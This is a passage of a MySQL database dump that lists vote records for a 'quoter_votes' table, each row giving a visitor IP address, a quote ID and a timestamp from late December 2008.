  (6404,'69.80.244.163','',0,175,1229882324),
  (6405,'69.80.244.163','',0,176,1229882328),
  (6406,'69.80.244.163','',0,177,1229882334),
  (6407,'69.80.244.163','',0,178,1229882339),
  (6408,'69.80.244.163','',0,180,1229882345),
  (6409,'69.80.244.163','',0,183,1229882352),
  (6410,'69.80.244.163','',0,184,1229882359),
  (6411,'69.80.244.163','',0,185,1229882365),
  (6412,'69.80.244.163','',0,189,1229882372),
  (6413,'69.80.244.163','',0,190,1229882377),
  (6414,'69.80.244.163','',0,195,1229882381),
  (6415,'69.80.244.163','',0,197,1229882385),
  (6416,'66.231.188.53','',0,12,1229882763),
  (6417,'91.122.17.62','',0,225,1229883123),
  (6418,'91.122.17.62','',0,212,1229883129),
  (6419,'94.253.51.27','',0,29,1229883317),
  (6420,'66.249.66.47','',0,230,1229883765),
  (6421,'66.249.66.47','',0,233,1229883819),
  (6422,'66.249.66.47','',0,239,1229883950),
  (6423,'91.124.1.91','',0,232,1229886431),
  (6424,'92.112.165.125','',0,237,1229887186),
  (6425,'78.29.92.46','',0,235,1229887351),
  (6426,'85.29.194.15','',0,237,1229888517),
  (6427,'85.29.194.15','',0,238,1229888551),
  (6428,'85.29.194.15','',0,232,1229888720),
  (6429,'85.140.155.169','',0,29,1229888960),
  (6430,'72.30.142.237','',0,137,1229889162),
  (6431,'84.19.181.92','',0,133,1229890889),
  (6432,'78.85.225.221','',0,231,1229891024),
  (6433,'72.30.142.237','',0,21,1229891028),
  (6434,'91.200.45.16','',0,239,1229891275),
  (6435,'91.200.45.16','',0,238,1229891355),
  (6436,'91.200.45.16','',0,237,1229891426),
  (6437,'91.200.45.16','',0,236,1229891457),
  (6438,'91.200.45.16','',0,235,1229891500),
  (6439,'66.249.66.47','',0,232,1229892122),
  (6440,'85.173.31.148','',0,238,1229892810),
  (6441,'85.173.31.148','',0,239,1229892815),
  (6442,'85.173.31.148','',0,218,1229892882),
  (6443,'93.175.237.124','',0,221,1229893359),
  (6444,'72.30.142.237','',0,16,1229894649),
  (6445,'67.202.43.229','',0,171,1229895234),
  (6446,'67.202.43.229','',0,226,1229895238),
  (6447,'67.202.43.229','',0,235,1229895244),
  (6448,'67.202.43.229','',0,225,1229895311),
  (6449,'67.202.43.229','',0,138,1229895377),
  (6450,'82.151.112.79','',0,1,1229895399),
  (6451,'67.202.43.229','',0,165,1229895516),
  (6452,'93.175.5.164','',0,213,1229895911),
  (6453,'93.175.5.164','',0,119,1229896070),
  (6454,'66.249.66.47','',0,231,1229896815),
  (6455,'66.249.66.47','',0,235,1229897721),
  (6456,'66.249.66.47','',0,229,1229897918),
  (6457,'77.88.30.246','',0,224,1229897946),
  (6458,'77.88.30.246','',0,230,1229897953),
  (6459,'77.88.30.246','',0,234,1229897958),
  (6460,'77.88.30.246','',0,223,1229898007),
  (6461,'72.30.142.237','',0,135,1229898374),
  (6462,'94.253.23.29','',0,237,1229898994),
  (6463,'91.122.21.223','',0,226,1229900508),
  (6464,'91.122.21.223','',0,225,1229900510),
  (6465,'91.122.21.223','',0,212,1229900513),
  (6466,'80.243.71.189','',0,55,1229904323),
  (6467,'80.243.71.189','',0,1,1229904325),
  (6468,'95.28.101.46','',0,214,1229905334),
  (6469,'72.30.142.237','',0,199,1229906665),
  (6470,'65.55.105.206','',0,165,1229909301),
  (6471,'72.30.142.237','',0,237,1229909465),
  (6472,'72.30.142.237','',0,238,1229909500),
  (6473,'72.30.142.237','',0,235,1229909559),
  (6474,'72.30.142.237','',0,231,1229909566),
  (6475,'72.30.142.237','',0,233,1229909577),
  (6476,'66.249.66.47','',0,231,1229909895),
  (6477,'72.30.142.237','',0,234,1229910449),
  (6478,'91.103.78.49','',0,1,1229911271),
  (6479,'91.103.78.49','',0,55,1229911273),
  (6480,'91.103.78.49','',0,21,1229911276),
  (6481,'91.103.78.49','',0,29,1229911281),
  (6482,'72.30.142.237','',0,62,1229911303),
  (6483,'67.202.43.229','',0,117,1229912693),
  (6484,'67.202.43.229','',0,129,1229912697),
  (6485,'67.202.43.229','',0,183,1229912702),
  (6486,'67.202.43.229','',0,38,1229912707),
  (6487,'67.202.43.229','',0,53,1229912714),
  (6488,'67.202.43.229','',0,66,1229912719),
  (6489,'67.202.43.229','',0,93,1229912722),
  (6490,'67.202.43.229','',0,95,1229912731),
  (6491,'67.202.43.229','',0,124,1229912782),
  (6492,'67.202.43.229','',0,136,1229912788),
  (6493,'67.202.43.229','',0,139,1229912798),
  (6494,'67.202.43.229','',0,143,1229912804),
  (6495,'67.202.43.229','',0,146,1229912809),
  (6496,'67.202.43.229','',0,156,1229912814),
  (6497,'67.202.43.229','',0,175,1229912822),
  (6498,'67.202.43.229','',0,39,1229912826),
  (6499,'67.202.43.229','',0,68,1229912836),
  (6500,'67.202.43.229','',0,83,1229912842);
COMMIT;

#
# Data for the `quoter_votes` table  (LIMIT 6500,500)
#

INSERT INTO `quoter_votes` (`id`, `ip`, `useragent`, `value`, `quote_id`, `created`) VALUES 
  (6501,'67.202.43.229','',0,98,1229912855),
  (6502,'67.202.43.229','',0,104,1229912987),
  (6503,'67.202.43.229','',0,105,1229912998),
  (6504,'67.202.43.229','',0,109,1229913004),
  (6505,'67.202.43.229','',0,114,1229913009),
  (6506,'67.202.43.229','',0,142,1229913013),
  (6507,'67.202.43.229','',0,154,1229913024),
  (6508,'67.202.43.229','',0,155,1229913029),
  (6509,'67.202.43.229','',0,69,1229913039),
  (6510,'67.202.43.229','',0,107,1229913080),
  (6511,'67.202.43.229','',0,134,1229913086),
  (6512,'67.202.43.229','',0,135,1229913091),
  (6513,'67.202.43.229','',0,63,1229913101),
  (6514,'67.202.43.229','',0,67,1229913106),
  (6515,'67.202.43.229','',0,103,1229913185),
  (6516,'67.202.43.229','',0,106,1229913201),
  (6517,'67.202.43.229','',0,120,1229913216),
  (6518,'67.202.43.229','',0,81,1229913238),
  (6519,'67.202.43.229','',0,115,1229913256),
  (6520,'67.202.43.229','',0,173,1229913282),
  (6521,'67.202.43.229','',0,80,1229913303),
  (6522,'67.202.43.229','',0,178,1229913395),
  (6523,'193.93.218.64','',0,237,1229914573),
  (6524,'89.163.18.80','',0,185,1229915081),
  (6525,'89.163.18.80','',0,171,1229915233),
  (6526,'89.163.18.80','',0,145,1229915442),
  (6527,'89.163.18.80','',0,119,1229915749),
  (6528,'89.163.18.80','',0,111,1229916067),
  (6529,'89.163.18.80','',0,62,1229916617),
  (6530,'89.163.18.80','',0,56,1229916699),
  (6531,'89.163.18.80','',0,55,1229916707),
  (6532,'89.163.18.80','',0,54,1229916733),
  (6533,'88.204.146.92','',0,55,1229918887),
  (6534,'66.249.66.47','',0,48,1229920305),
  (6535,'72.30.142.237','',0,230,1229922769),
  (6536,'67.202.43.229','',0,60,1229923341),
  (6537,'67.202.43.229','',0,55,1229923472),
  (6538,'67.202.43.229','',0,100,1229923601),
  (6539,'81.1.232.213','',0,234,1229925756),
  (6540,'84.17.2.10','',0,238,1229925859),
  (6541,'84.17.2.10','',0,236,1229925872),
  (6542,'84.17.2.10','',0,235,1229925882),
  (6543,'80.89.145.65','',0,236,1229925940),
  (6544,'80.89.145.65','',0,234,1229925954),
  (6545,'84.17.2.10','',0,233,1229925991),
  (6546,'84.17.2.10','',0,232,1229926029),
  (6547,'80.89.145.65','',0,147,1229926041),
  (6548,'80.89.145.65','',0,87,1229926055),
  (6549,'84.17.2.10','',0,223,1229926365),
  (6550,'84.17.2.10','',0,221,1229926375),
  (6551,'81.1.232.213','',0,236,1229926476),
  (6552,'81.1.232.213','',0,136,1229926509),
  (6553,'81.1.232.213','',0,135,1229926513),
  (6554,'81.1.232.213','',0,73,1229926544),
  (6555,'81.1.232.213','',0,58,1229926556),
  (6556,'81.1.232.213','',0,55,1229926629),
  (6557,'81.1.232.213','',0,216,1229926842),
  (6558,'91.122.21.223','',0,225,1229927582),
  (6559,'91.122.21.223','',0,226,1229927583),
  (6560,'91.122.21.223','',0,212,1229927591),
  (6561,'91.122.21.223','',0,171,1229927615),
  (6562,'92.113.144.146','',0,238,1229929589),
  (6563,'82.193.115.138','',0,60,1229931084),
  (6564,'82.193.115.138','',0,55,1229931094),
  (6565,'66.249.66.47','',0,184,1229931415),
  (6566,'66.249.66.47','',0,185,1229931424),
  (6567,'66.249.66.47','',0,202,1229931427),
  (6568,'66.249.66.47','',0,201,1229931428),
  (6569,'66.249.66.47','',0,199,1229931434),
  (6570,'66.249.66.47','',0,197,1229931434),
  (6571,'66.249.66.47','',0,189,1229931436),
  (6572,'66.249.66.47','',0,190,1229931441),
  (6573,'66.249.66.47','',0,203,1229931453),
  (6574,'66.249.66.47','',0,195,1229931463),
  (6575,'72.30.142.237','',0,235,1229932331),
  (6576,'195.20.195.133','',0,130,1229933366),
  (6577,'195.20.195.133','',0,85,1229933380),
  (6578,'92.101.107.174','',0,232,1229935115),
  (6579,'81.19.66.89','',0,178,1229935249),
  (6580,'92.101.107.174','',0,225,1229935256),
  (6581,'81.19.66.89','',0,180,1229935463),
  (6582,'81.19.66.89','',0,183,1229935465),
  (6583,'81.19.66.89','',0,184,1229935642),
  (6584,'81.19.66.89','',0,185,1229935880),
  (6585,'81.19.66.89','',0,190,1229935885),
  (6586,'81.19.66.89','',0,195,1229936084),
  (6587,'81.19.66.89','',0,222,1229936340),
  (6588,'81.19.66.89','',0,221,1229936341),
  (6589,'81.19.66.89','',0,223,1229936549),
  (6590,'81.19.66.89','',0,225,1229936553),
  (6591,'81.19.66.89','',0,224,1229936761),
  (6592,'66.249.66.47','',0,183,1229936771),
  (6593,'81.19.66.89','',0,227,1229936944),
  (6594,'81.19.66.89','',0,226,1229936945),
  (6595,'81.19.66.89','',0,229,1229937132),
  (6596,'78.24.227.141','',0,55,1229938292),
  (6597,'78.24.227.141','',0,1,1229938293),
  (6598,'81.25.46.86','',0,219,1229938393),
  (6599,'81.25.46.86','',0,224,1229938487),
  (6600,'89.179.122.69','',0,221,1229939764),
  (6601,'72.30.142.237','',0,75,1229942127),
  (6602,'78.24.227.141','',0,212,1229943093),
  (6603,'66.249.66.47','',0,178,1229944699),
  (6604,'217.18.135.36','',0,212,1229945358),
  (6605,'84.17.2.10','',0,233,1229945389),
  (6606,'77.90.240.132','',0,232,1229945589),
  (6607,'212.98.163.238','',0,61,1229947229),
  (6608,'94.25.18.77','',0,61,1229947514),
  (6609,'85.90.202.26','',0,236,1229947573),
  (6610,'85.90.202.26','',0,235,1229947605),
  (6611,'89.218.28.159','',0,55,1229948387),
  (6612,'91.76.56.249','',0,234,1229950472),
  (6613,'91.76.56.249','',0,233,1229950479),
  (6614,'91.76.56.249','',0,232,1229950490),
  (6615,'195.39.196.252','',0,55,1229951873),
  (6616,'195.39.196.252','',0,60,1229951888),
  (6617,'195.39.196.252','',0,30,1229952119),
  (6618,'78.29.93.157','',0,235,1229952960),
  (6619,'78.29.93.157','',0,212,1229952975),
  (6620,'78.29.93.157','',0,213,1229952979),
  (6621,'78.29.93.157','',0,215,1229952982),
  (6622,'78.29.93.157','',0,216,1229952984),
  (6623,'78.29.93.157','',0,225,1229952985),
  (6624,'78.29.93.157','',0,226,1229952985),
  (6625,'78.29.93.157','',0,227,1229952987),
  (6626,'78.29.93.157','',0,165,1229952993),
  (6627,'78.29.93.157','',0,171,1229952997),
  (6628,'94.178.120.62','',0,235,1229954572),
  (6629,'94.178.120.62','',0,218,1229954886),
  (6630,'80.250.159.240','',0,133,1229954927),
  (6631,'84.204.148.130','',0,235,1229955850),
  (6632,'84.204.148.130','',0,227,1229955916),
  (6633,'66.249.66.47','',0,178,1229955942),
  (6634,'85.140.152.251','',0,240,1229956437),
  (6635,'81.222.193.146','',0,233,1229956587),
  (6636,'92.47.212.246','',0,55,1229956704),
  (6637,'81.222.193.146','',0,202,1229956995),
  (6638,'213.33.216.246','',0,223,1229957015),
  (6639,'66.249.66.47','',0,62,1229957339),
  (6640,'213.33.216.246','',0,213,1229957394),
  (6641,'213.33.216.246','',0,178,1229957672),
  (6642,'213.33.216.246','',0,129,1229957770),
  (6643,'85.223.180.118','',0,236,1229958830),
  (6644,'85.223.180.118','',0,235,1229958835),
  (6645,'85.223.180.118','',0,230,1229958868),
  (6646,'85.223.180.118','',0,241,1229958928),
  (6647,'194.158.195.226','',0,241,1229958947),
  (6648,'213.33.216.246','',0,56,1229959264),
  (6649,'85.223.180.118','',0,125,1229959374),
  (6650,'77.234.5.91','',0,241,1229959513),
  (6651,'82.207.101.175','',0,222,1229959642),
  (6652,'88.204.16.169','',0,240,1229959768),
  (6653,'213.184.248.166','',0,233,1229959821),
  (6654,'213.184.248.166','',0,232,1229959832),
  (6655,'88.204.16.169','',0,241,1229959848),
  (6656,'213.184.248.166','',0,238,1229959855),
  (6657,'213.184.248.166','',0,224,1229959866),
  (6658,'88.204.16.169','',0,234,1229959866),
  (6659,'213.184.248.166','',0,13,1229959895),
  (6660,'213.184.248.166','',0,9,1229959913),
  (6661,'213.184.248.166','',0,8,1229959925),
  (6662,'213.184.248.166','',0,176,1229959939),
  (6663,'91.146.52.99','',0,214,1229960314),
  (6664,'141.14.28.118','',0,100,1229962592),
  (6665,'212.98.179.118','',0,222,1229963080),
  (6666,'212.98.179.118','',0,213,1229963190),
  (6667,'212.98.179.118','',0,212,1229963194),
  (6668,'212.98.179.118','',0,208,1229963210),
  (6669,'212.98.179.118','',0,207,1229963222),
  (6670,'212.98.179.118','',0,206,1229963245),
  (6671,'212.98.179.118','',0,204,1229963360),
  (6672,'212.98.179.118','',0,201,1229963393),
  (6673,'195.69.247.119','',0,229,1229963787),
  (6674,'195.42.130.254','',0,235,1229965072),
  (6675,'195.42.130.254','',0,221,1229965178),
  (6676,'65.55.105.192','',0,163,1229965677),
  (6677,'91.192.33.200','',0,56,1229965855),
  (6678,'65.55.110.94','',0,163,1229966044),
  (6679,'82.207.125.180','',0,227,1229968956),
  (6680,'82.207.125.180','',0,171,1229969033),
  (6681,'66.249.66.47','',0,240,1229969039),
  (6682,'66.249.66.47','',0,242,1229969100),
  (6683,'66.249.66.47','',0,241,1229969106),
  (6684,'66.249.66.47','',0,243,1229969131),
  (6685,'72.30.142.237','',0,218,1229969827),
  (6686,'89.138.61.205','',0,243,1229970196),
  (6687,'89.138.61.205','',0,241,1229970248),
  (6688,'91.122.17.94','',0,226,1229971036),
  (6689,'91.122.17.94','',0,225,1229971041),
  (6690,'91.122.17.94','',0,212,1229971046),
  (6691,'66.249.66.47','',0,48,1229971661),
  (6692,'94.253.17.75','',0,242,1229973154),
  (6693,'94.253.17.75','',0,234,1229973196),
  (6694,'72.30.142.237','',0,236,1229973291),
  (6695,'79.171.124.210','',0,227,1229973926),
  (6696,'85.173.10.116','',0,234,1229973986),
  (6697,'85.173.10.116','',0,113,1229974066),
  (6698,'85.173.10.116','',0,231,1229974149),
  (6699,'85.173.10.116','',0,184,1229974675),
  (6700,'79.181.133.248','',0,233,1229974927),
  (6701,'194.187.50.162','',0,241,1229975196),
  (6702,'194.187.50.162','',0,212,1229975257),
  (6703,'194.187.50.162','',0,235,1229975274),
  (6704,'194.187.50.162','',0,205,1229975311),
  (6705,'194.187.50.162','',0,173,1229975335),
  (6706,'92.255.219.239','',0,234,1229976058),
  (6707,'78.36.162.102','',0,12,1229976116),
  (6708,'78.29.93.157','',0,235,1229976792),
  (6709,'72.30.142.237','',0,50,1229977021),
  (6710,'92.112.96.204','',0,243,1229979310),
  (6711,'72.30.142.237','',0,238,1229981888),
  (6712,'95.81.201.236','',0,241,1229982078),
  (6713,'95.81.201.236','',0,238,1229982116),
  (6714,'91.124.230.158','',0,215,1229982282),
  (6715,'72.30.142.237','',0,60,1229983257),
  (6716,'94.180.182.133','',0,229,1229983415),
  (6717,'94.180.182.133','',0,1,1229983533),
  (6718,'94.180.182.133','',0,55,1229983536),
  (6719,'94.180.182.133','',0,212,1229983688),
  (6720,'94.180.182.133','',0,221,1229984330),
  (6721,'94.180.182.133','',0,219,1229984390),
  (6722,'91.149.148.69','',0,245,1229985019),
  (6723,'91.149.148.69','',0,243,1229985035),
  (6724,'156.17.237.13','',0,245,1229986093),
  (6725,'89.232.129.102','',0,238,1229986304),
  (6726,'89.232.129.102','',0,233,1229986307),
  (6727,'89.232.129.102','',0,218,1229986609),
  (6728,'72.30.142.237','',0,30,1229988177),
  (6729,'72.30.142.237','',0,147,1229990001),
  (6730,'82.196.87.202','',0,142,1229991580),
  (6731,'82.196.87.202','',0,21,1229991674),
  (6732,'82.196.87.202','',0,29,1229991687),
  (6733,'82.196.87.202','',0,56,1229991713),
  (6734,'82.196.87.202','',0,212,1229991771),
  (6735,'82.196.87.202','',0,213,1229991787),
  (6736,'82.196.87.202','',0,227,1229991800),
  (6737,'82.196.87.202','',0,145,1229991860),
  (6738,'75.19.35.49','',0,242,1229991880),
  (6739,'75.19.35.49','',0,238,1229991919),
  (6740,'82.196.87.202','',0,226,1229991990),
  (6741,'72.30.142.237','',0,234,1229992168),
  (6742,'82.196.87.202','',0,231,1229992269),
  (6743,'82.196.87.202','',0,230,1229992320),
  (6744,'75.19.35.49','',0,235,1229992466),
  (6745,'82.196.87.202','',0,207,1229992468),
  (6746,'94.51.4.98','',0,185,1229993100),
  (6747,'80.243.71.189','',0,246,1229995390),
  (6748,'80.243.71.189','',0,245,1229995392),
  (6749,'80.243.71.189','',0,242,1229995412),
  (6750,'80.243.71.189','',0,240,1229995421),
  (6751,'72.30.142.237','',0,203,1229995434),
  (6752,'80.243.71.189','',0,207,1229995607),
  (6753,'72.30.142.237','',0,246,1229996460),
  (6754,'72.30.142.237','',0,244,1229996539),
  (6755,'72.30.142.237','',0,245,1229996559),
  (6756,'72.30.142.237','',0,243,1229996783),
  (6757,'72.30.142.237','',0,240,1230000156),
  (6758,'66.249.65.207','',0,245,1230000171),
  (6759,'66.249.66.47','',0,246,1230000282),
  (6760,'66.249.66.47','',0,244,1230000306),
  (6761,'66.249.66.47','',0,245,1230001116),
  (6762,'66.249.66.47','',0,219,1230002510),
  (6763,'66.249.66.47','',0,38,1230002840),
  (6764,'92.113.4.97','',0,245,1230007174),
  (6765,'92.113.4.97','',0,246,1230007199),
  (6766,'92.113.4.97','',0,21,1230007256),
  (6767,'92.113.4.97','',0,29,1230007344),
  (6768,'92.113.4.97','',0,120,1230007373),
  (6769,'72.30.78.231','',0,58,1230008713),
  (6770,'217.150.41.85','',0,223,1230010368),
  (6771,'89.223.118.114','',0,180,1230011212),
  (6772,'82.193.113.236','',0,240,1230012559),
  (6773,'72.30.78.231','',0,231,1230013513),
  (6774,'84.17.2.10','',0,245,1230015219),
  (6775,'91.185.53.187','',0,85,1230015835),
  (6776,'72.30.78.231','',0,235,1230017200),
  (6777,'72.30.78.231','',0,70,1230017547),
  (6778,'93.185.182.24','',0,246,1230017737),
  (6779,'93.185.182.24','',0,245,1230017754),
  (6780,'84.17.2.10','',0,246,1230019410),
  (6781,'72.30.78.231','',0,77,1230019681),
  (6782,'212.9.228.2','',0,56,1230020468),
  (6783,'212.9.228.2','',0,55,1230020699),
  (6784,'212.9.228.2','',0,215,1230020861),
  (6785,'92.46.29.150','',0,55,1230021041),
  (6786,'72.30.78.231','',0,73,1230022956),
  (6787,'87.249.18.214','',0,215,1230023371),
  (6788,'82.207.125.180','',0,245,1230024791),
  (6789,'78.24.226.160','',0,55,1230025998),
  (6790,'78.24.226.160','',0,1,1230026004),
  (6791,'193.201.100.1','',0,204,1230026160),
  (6792,'72.30.78.231','',0,177,1230026168),
  (6793,'82.142.191.254','',0,238,1230026610),
  (6794,'193.201.100.1','',0,224,1230026645),
  (6795,'72.30.78.231','',0,241,1230027936),
  (6796,'91.124.222.104','',0,242,1230028546),
  (6797,'91.124.222.104','',0,238,1230028592),
  (6798,'91.124.222.104','',0,208,1230028808),
  (6799,'217.12.195.230','',0,173,1230029136),
  (6800,'80.243.4.222','',0,238,1230029241),
  (6801,'80.243.4.222','',0,242,1230029245),
  (6802,'67.202.43.229','',0,229,1230030173),
  (6803,'80.243.4.222','',0,1,1230030582),
  (6804,'80.243.4.222','',0,3,1230030617),
  (6805,'80.243.4.222','',0,6,1230030629),
  (6806,'72.30.78.231','',0,184,1230030867),
  (6807,'80.243.4.222','',0,8,1230030959),
  (6808,'80.243.4.222','',0,9,1230030986),
  (6809,'213.170.74.12','',0,244,1230031203),
  (6810,'94.25.18.77','',0,241,1230031289),
  (6811,'94.25.18.77','',0,240,1230031308),
  (6812,'94.25.18.77','',0,229,1230031509),
  (6813,'94.25.18.77','',0,214,1230031768),
  (6814,'80.243.4.222','',0,18,1230032643),
  (6815,'80.243.4.222','',0,20,1230032735),
  (6816,'80.243.4.222','',0,11,1230032912),
  (6817,'80.243.4.222','',0,53,1230033033),
  (6818,'88.204.16.169','',0,245,1230033061),
  (6819,'72.30.78.231','',0,202,1230033264),
  (6820,'88.204.16.169','',0,247,1230033269),
  (6821,'88.204.16.169','',0,248,1230033350),
  (6822,'80.243.4.222','',0,30,1230033479),
  (6823,'80.243.4.222','',0,29,1230033487),
  (6824,'72.30.78.231','',0,221,1230033507),
  (6825,'80.243.4.222','',0,63,1230033545),
  (6826,'80.243.4.222','',0,62,1230033549),
  (6827,'72.30.78.231','',0,219,1230033592),
  (6828,'80.243.4.222','',0,61,1230033610),
  (6829,'80.243.4.222','',0,56,1230033651),
  (6830,'80.243.4.222','',0,55,1230033659),
  (6831,'156.17.237.13','',0,249,1230033660),
  (6832,'82.207.118.234','',0,161,1230033823),
  (6833,'80.243.4.222','',0,93,1230034241),
  (6834,'80.243.4.222','',0,90,1230034246),
  (6835,'80.243.4.222','',0,85,1230034314),
  (6836,'80.243.4.222','',0,104,1230034518),
  (6837,'80.243.4.222','',0,94,1230034851),
  (6838,'212.98.179.118','',0,250,1230034915),
  (6839,'212.98.179.118','',0,242,1230034942),
  (6840,'72.30.78.231','',0,222,1230034974),
  (6841,'80.243.4.222','',0,117,1230034986),
  (6842,'66.249.66.47','',0,183,1230035070),
  (6843,'80.243.4.222','',0,111,1230035071),
  (6844,'80.243.4.222','',0,110,1230035101),
  (6845,'80.243.4.222','',0,109,1230035105),
  (6846,'80.243.4.222','',0,107,1230035272),
  (6847,'80.243.4.222','',0,106,1230035283),
  (6848,'80.243.4.222','',0,133,1230035305),
  (6849,'80.243.4.222','',0,129,1230035359),
  (6850,'80.243.4.222','',0,124,1230035408),
  (6851,'80.243.4.222','',0,120,1230035431),
  (6852,'80.243.4.222','',0,119,1230035514),
  (6853,'141.14.28.118','',0,100,1230035618),
  (6854,'80.243.4.222','',0,140,1230036156),
  (6855,'195.3.254.53','',0,249,1230037023),
  (6856,'195.3.254.53','',0,244,1230037068),
  (6857,'195.3.254.53','',0,238,1230037115),
  (6858,'195.3.252.6','',0,71,1230037679),
  (6859,'195.3.252.6','',0,48,1230037687),
  (6860,'195.3.252.6','',0,21,1230037688),
  (6861,'195.3.254.53','',0,21,1230037787),
  (6862,'195.3.252.6','',0,107,1230037805),
  (6863,'195.16.44.210','',0,55,1230037870),
  (6864,'217.146.146.246','',0,235,1230038381),
  (6865,'213.148.164.100','',0,249,1230038656),
  (6866,'82.138.55.2','',0,233,1230038772),
  (6867,'82.138.55.2','',0,223,1230039120),
  (6868,'212.58.193.154','',0,244,1230039238),
  (6869,'95.56.4.105','',0,55,1230039338),
  (6870,'82.138.55.2','',0,216,1230039405),
  (6871,'79.126.44.232','',0,245,1230039588),
  (6872,'82.138.55.2','',0,212,1230039671),
  (6873,'91.124.211.216','',0,250,1230039854),
  (6874,'72.30.78.231','',0,242,1230040723),
  (6875,'72.30.78.231','',0,233,1230040959),
  (6876,'72.30.78.231','',0,246,1230041474),
  (6877,'88.204.16.169','',0,21,1230041565),
  (6878,'88.204.16.169','',0,56,1230041722),
  (6879,'88.204.16.169','',0,18,1230041779),
  (6880,'88.204.16.169','',0,173,1230041877),
  (6881,'62.221.49.72','',0,235,1230041891),
  (6882,'62.221.49.72','',0,236,1230041909),
  (6883,'88.204.16.169','',0,120,1230041916),
  (6884,'88.204.16.169','',0,212,1230041938),
  (6885,'88.204.16.169','',0,109,1230042099),
  (6886,'88.204.16.169','',0,221,1230042116),
  (6887,'66.249.66.47','',0,190,1230042304),
  (6888,'212.98.179.118','',0,249,1230042513),
  (6889,'212.98.179.118','',0,197,1230042717),
  (6890,'212.98.179.118','',0,171,1230042866),
  (6891,'212.98.179.118','',0,164,1230042876),
  (6892,'85.21.111.110','',0,249,1230042890),
  (6893,'212.98.179.118','',0,176,1230042965),
  (6894,'212.98.179.118','',0,219,1230043221),
  (6895,'212.98.179.118','',0,215,1230043341),
  (6896,'212.98.179.118','',0,213,1230043347),
  (6897,'212.98.179.118','',0,122,1230043455),
  (6898,'212.98.179.118','',0,119,1230043461),
  (6899,'81.30.112.106','',0,113,1230043839),
  (6900,'95.48.22.66','',0,249,1230044382),
  (6901,'72.30.78.231','',0,139,1230044386),
  (6902,'80.73.0.127','',0,250,1230044613),
  (6903,'80.73.0.127','',0,247,1230044617),
  (6904,'217.12.195.230','',0,23,1230044718),
  (6905,'72.30.78.231','',0,118,1230044725),
  (6906,'217.12.195.230','',0,111,1230044998),
  (6907,'72.30.78.231','',0,50,1230045464),
  (6908,'62.181.55.40','',0,251,1230045942),
  (6909,'72.30.78.231','',0,134,1230046129),
  (6910,'217.8.236.142','',0,242,1230046177),
  (6911,'194.186.235.214','',0,251,1230046332),
  (6912,'94.248.69.206','',0,165,1230046386),
  (6913,'194.186.235.214','',0,240,1230046640),
  (6914,'194.186.235.214','',0,214,1230046655),
  (6915,'194.186.235.214','',0,190,1230046670),
  (6916,'80.243.4.222','',0,137,1230046850),
  (6917,'80.243.4.222','',0,161,1230046993),
  (6918,'66.249.66.47','',0,129,1230047010),
  (6919,'94.241.2.127','',0,251,1230047079),
  (6920,'80.243.4.222','',0,156,1230047093),
  (6921,'91.77.241.217','',0,1,1230047273),
  (6922,'80.243.4.222','',0,154,1230047276),
  (6923,'91.77.241.217','',0,29,1230047280),
  (6924,'91.77.241.217','',0,18,1230047290),
  (6925,'80.243.4.222','',0,152,1230047297),
  (6926,'92.244.233.170','',0,238,1230047313),
  (6927,'80.243.4.222','',0,145,1230047334),
  (6928,'80.243.4.222','',0,178,1230047388),
  (6929,'80.243.4.222','',0,177,1230047411),
  (6930,'80.243.4.222','',0,175,1230047458),
  (6931,'80.243.4.222','',0,173,1230047515),
  (6932,'80.243.4.222','',0,172,1230047572),
  (6933,'80.243.4.222','',0,171,1230047588),
  (6934,'80.243.4.222','',0,164,1230047672),
  (6935,'80.243.4.222','',0,163,1230047739),
  (6936,'80.243.4.222','',0,201,1230047869),
  (6937,'72.30.78.231','',0,220,1230048228),
  (6938,'82.207.118.234','',0,104,1230048300),
  (6939,'217.174.97.213','',0,77,1230049271),
  (6940,'217.174.97.213','',0,21,1230049317),
  (6941,'217.174.97.213','',0,29,1230049330),
  (6942,'217.174.97.213','',0,56,1230049339),
  (6943,'217.174.97.213','',0,79,1230049773),
  (6944,'194.226.199.73','',0,249,1230049851),
  (6945,'194.226.199.73','',0,247,1230049867),
  (6946,'194.226.199.73','',0,142,1230049906),
  (6947,'156.17.237.13','',0,249,1230050118),
  (6948,'91.202.197.79','',0,249,1230050400),
  (6949,'91.202.197.79','',0,247,1230050406),
  (6950,'84.204.148.130','',0,251,1230050573),
  (6951,'84.204.148.130','',0,248,1230050615),
  (6952,'84.204.148.130','',0,247,1230050663),
  (6953,'91.202.197.79','',0,238,1230050667),
  (6954,'84.204.148.130','',0,246,1230050675),
  (6955,'84.204.148.130','',0,244,1230050707),
  (6956,'91.202.197.79','',0,244,1230050723),
  (6957,'84.204.148.130','',0,243,1230050741),
  (6958,'72.30.78.231','',0,233,1230051093),
  (6959,'80.243.4.222','',0,197,1230051376),
  (6960,'84.204.148.130','',0,215,1230051549),
  (6961,'80.243.4.222','',0,180,1230051666),
  (6962,'80.243.4.222','',0,213,1230051904),
  (6963,'80.243.4.222','',0,212,1230051924),
  (6964,'80.243.4.222','',0,208,1230052018),
  (6965,'80.243.4.222','',0,206,1230052223),
  (6966,'80.243.4.222','',0,229,1230052327),
  (6967,'72.30.78.231','',0,190,1230052392),
  (6968,'80.243.4.222','',0,224,1230052485),
  (6969,'80.243.4.222','',0,222,1230052675),
  (6970,'80.243.4.222','',0,221,1230052781),
  (6971,'80.243.4.222','',0,220,1230052861),
  (6972,'72.30.78.231','',0,223,1230053022),
  (6973,'80.243.4.222','',0,218,1230053074),
  (6974,'80.243.4.222','',0,216,1230053083),
  (6975,'80.243.4.222','',0,242,1230053093),
  (6976,'80.243.4.222','',0,238,1230053141),
  (6977,'80.243.4.222','',0,235,1230053195),
  (6978,'80.243.4.222','',0,234,1230053244),
  (6979,'80.243.4.222','',0,252,1230053862),
  (6980,'80.243.4.222','',0,250,1230053928),
  (6981,'80.243.4.222','',0,248,1230053962),
  (6982,'80.243.4.222','',0,245,1230054044),
  (6983,'80.243.4.222','',0,253,1230054396),
  (6984,'64.1.215.165','',0,221,1230056827),
  (6985,'85.141.27.50','',0,221,1230058686),
  (6986,'92.50.248.33','',0,199,1230059938),
  (6987,'92.50.248.33','',0,197,1230059943),
  (6988,'92.50.248.33','',0,195,1230059948),
  (6989,'94.248.76.229','',0,235,1230060012),
  (6990,'94.248.76.229','',0,165,1230060020),
  (6991,'85.140.64.255','',0,253,1230061510),
  (6992,'85.140.64.255','',0,252,1230061527),
  (6993,'77.45.204.67','',0,234,1230064489),
  (6994,'72.30.78.231','',0,111,1230065389),
  (6995,'91.122.30.48','',0,212,1230067166),
  (6996,'91.122.30.48','',0,171,1230067171),
  (6997,'72.30.78.231','',0,156,1230067490),
  (6998,'77.123.113.17','',0,252,1230067607),
  (6999,'66.249.66.47','',0,184,1230067757),
